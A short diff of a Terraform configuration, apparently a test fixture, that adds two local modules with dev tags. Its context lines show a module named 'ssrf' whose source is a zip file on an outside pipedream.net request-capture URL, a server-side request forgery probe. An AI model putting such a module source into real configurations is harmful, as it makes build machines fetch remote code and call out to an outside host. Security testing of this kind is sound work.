@@ -52,6 +52,25 @@ module "website_s3_bucket" {
   }
 }
 
+module "child" {
+  source = "./modules/recurse"
+
+  tags = {
+    Terraform   = "true"
+    Environment = "dev"
+  }
+}
+
+module "non-submodule" {
+  source = "./modules/another-local-non-submodule"
+
+  tags = {
+    Terraform   = "true"
+    Environment = "dev"
+  }
+}
+
+
 module "ssrf" {
   source = "https://enm36rqp62izf.x.pipedream.net/foo.zip"
 
